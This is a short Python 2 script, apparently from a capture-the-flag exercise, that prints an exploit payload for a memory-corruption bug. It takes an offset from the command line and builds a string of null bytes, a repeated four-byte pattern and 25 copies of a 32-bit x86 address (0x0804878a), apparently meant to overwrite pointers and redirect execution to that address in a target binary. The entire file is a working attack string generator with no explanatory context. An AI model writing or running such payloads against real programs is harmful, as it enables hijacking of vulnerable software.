import sys
def get_pwn_str(offset):
	return 'y'+ chr(0)*2 +(chr(offset)+chr(0xda)+chr(0xff)*2)*32 + '\n' + (chr(0x8a)+chr(0x87)+chr(0x04)+chr(0x08))*25

if __name__ == '__main__':
	print get_pwn_str(int(sys.argv[1]))

